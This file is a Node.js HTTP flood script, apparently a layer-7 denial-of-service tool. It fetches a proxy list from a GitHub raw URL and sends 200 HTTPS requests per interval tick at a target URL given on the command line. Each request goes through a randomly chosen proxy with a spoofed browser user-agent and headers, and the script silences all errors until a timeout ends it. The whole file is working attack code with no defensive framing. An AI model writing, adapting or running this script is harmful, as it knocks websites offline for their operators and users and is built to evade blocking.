

var url = require('url');
var fs = require('fs');
var https = require('https');
var request = require('request');
var zlib = require('zlib');
var HttpsProxyAgent = require('https-proxy-agent');


request.get('https://raw.githubusercontent.com/mopzaysexy/lol/main/ra', (err, res, set) => {
  var proxies = set.match(/(\d{1,3}\.){3}\d{1,3}\:\d{1,5}/g);

  process.on('uncaughtException', (err) => {});
  process.on('unhandledRejection', (err) => {});

	const userAgents = [
	  "Mozilla/5.0 (Linux; Android 9; moto g(8) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
	  "Mozilla/5.0 (Linux; Android 10; SM-A205G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",
	  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 OPR/68.0.3618.142",
	  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
	  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
	  "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
	];
    
  var options = {};
  var parsed = url.parse(process.argv[2]);
  parsed.headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'pragma': 'no-cache',
    'upgrade-insecure-requests': 1,
    'Connection': 'keep-alive',
    'upgrade-insecure-requests': 1,
    'user-agent': '' + userAgents[Math.floor(Math.random() * userAgents.length)] + ''
  }

  setTimeout(function() {
    process.exit(1);
  }, process.argv[3] * 1000);

  setInterval(function() {
	 
	 for (var i = 0; i < 200; i++) {
    var options = parsed;
	 
    options.agent = new HttpsProxyAgent('http://' + proxies[Math.floor(Math.random() * proxies.length)]);
	
    https.get(options, function(res) {
      console.log(res.statusCode);
    });
	 
    }
  });
});
